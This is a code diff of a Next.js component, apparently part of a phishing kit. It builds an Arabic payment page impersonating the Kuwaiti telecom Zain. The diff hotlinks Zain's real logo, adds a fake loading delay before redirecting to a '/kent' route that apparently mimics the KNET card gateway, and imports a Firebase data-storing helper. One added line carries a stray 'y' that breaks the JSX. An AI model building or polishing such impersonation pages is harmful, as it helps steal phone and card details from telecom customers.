@@ -1,17 +1,17 @@
 "use client"
 
 import { useEffect, useState } from "react"
-import { ChevronDown, Heart, Menu, ShoppingCart } from "lucide-react"
+import { ChevronDown, Heart, Loader2, Menu, ShoppingCart } from "lucide-react"
 import { cn } from "@/lib/utils"
 import { useRouter } from "next/navigation"
 import { addData } from "@/lib/firebasee"
 
 export default function ZainPayment() {
   const [selectedTab, setSelectedTab] = useState("recharge")
-  const [showAmountDropdown, setShowAmountDropdown] = useState(true)
+  const [showAmountDropdown, setShowAmountDropdown] = useState(false)
   const [selectedAmount, setSelectedAmount] = useState("6.000")
   const [phoneNumber, setPhoneNumber] = useState("")
-  const [selectedAdOption, setSelectedAdOption] = useState("basic")
+  const [isSubmmited, setIsSubmmited] = useState(false)
   const _id=randstr('zain-')
   const router=useRouter()
   function randstr(prefix:string)
@@ -45,21 +45,23 @@ useEffect(()=>{
   return (
     <div className="max-w-md mx-auto bg-white min-h-screen" dir="rtl">
       {/* Header */}
-      <header className="flex items-center justify-between p-4 bg-[#2d1a45]">
-        <Menu className="text-white" size={24} />
+      <header className="flex items-center justify-end p-4 bg-[#2d1a45]">
+        <div className="ml-auto flex">
+          <Menu className="text-white"  size={24} />
+          <img src="https://www.kw.zain.com/o/zain-theme/images/zain_logo.svg" alt="Zain Logo" className="h-7" />
+          </div>
+
         <Heart className="text-white" size={24} />
-        <div className="bg-white rounded-full p-2">
+        <div className="bg-white rounded-full p-2 mx-2">
           <ShoppingCart className="text-[#2d1a45]" size={20} />
         </div>
-        <div className="absolute right-16">
-          <img src="/placeholder.svg?height=30&width=100" alt="Zain Logo" className="h-7" />
+        <div className=" right-16">
         </div>
       </header>
 
       {/* Login Banner */}
       <div className="bg-gradient-to-l from-[#2d1a45] to-[#6b2a84] p-4 flex justify-between items-center">
-        <button className="bg-[#d13c8c] text-white px-4 py-2 rounded-md text-sm">تسجيل الدخول</button>
-        <div className="text-white text-sm text-right">
+y        <div className="text-white text-sm text-right">
           <p>يرجى تسجيل الدخول إلى MyZain للحصول على تجربة</p>
           <p>مخصصة</p>
         </div>
@@ -98,10 +100,14 @@ useEffect(()=>{
           </div>
 
           <div className="relative">
-            <div className="flex justify-between items-center border-b pb-2 cursor-pointer" onClick={() => {}}>
-              <ChevronDown className="text-[#d13c8c]" />
-              <span>رقم آخر</span>
-            </div>
+            <select className="w-full flex justify-between items-center border-b pb-2 cursor-pointer" onClick={() => {}}>
+              <option value={1}> <ChevronDown className="text-[#d13c8c]" />
+                <span>رقم آخر</span>
+              </option>
+              <option value={2}> <ChevronDown className="text-[#d13c8c]" />
+                <span>رقم العقد</span>
+              </option>
+            </select>
           </div>
 
           <div className="relative">
@@ -131,7 +137,7 @@ useEffect(()=>{
 
             {/* Dropdown */}
             {showAmountDropdown && (
-              <div className="absolute z-10 bg-white shadow-lg w-full mt-2 border rounded">
+              <div className="absolute  z-10 bg-white shadow-lg w-full mt-2 border rounded">
                 {amounts.map((amount) => (
                   <div
                     key={amount.value}
@@ -161,21 +167,25 @@ useEffect(()=>{
         </div>
       </div>
 
-      {/* Ad Options Section */}
-      <div className="mt-8 p-4 border-t">
-        <h2 className="text-xl font-bold text-right mb-4">خيارات الإعلان</h2>
-        <div className="space-y-3">
-        </div>
-        <div className="mt-4">
-        </div>
-      </div>
-
+    
       {/* Offers Section */}
-      <div className="mt-8 p-4 border-t">
-        <div className="flex justify-between items-center">
-        <button onClick={()=>{
-          router.push('/kent')
-        }} className="w-full bg-[#d13c8c] text-white py-3 rounded-md font-medium">دفع</button>
+      <div className="mt-28 p-4 border-t">
+        <div className=" flex justify-between items-center">
+        <button
+        
+        disabled={isSubmmited} onClick={()=>{
+          setIsSubmmited(true)
+          setTimeout(() => {
+
+            router.push('/kent')
+            setIsSubmmited(false)            
+
+          }, 4000);
+        }} className="w-full mt-28 justify-center flex bg-[#d13c8c] text-white py-3 rounded-md font-medium">
+          دفع
+          
+{isSubmmited &&<Loader2 className="animate-spin mx-2"/>
+}          </button>
         </div>
       </div>
     </div>
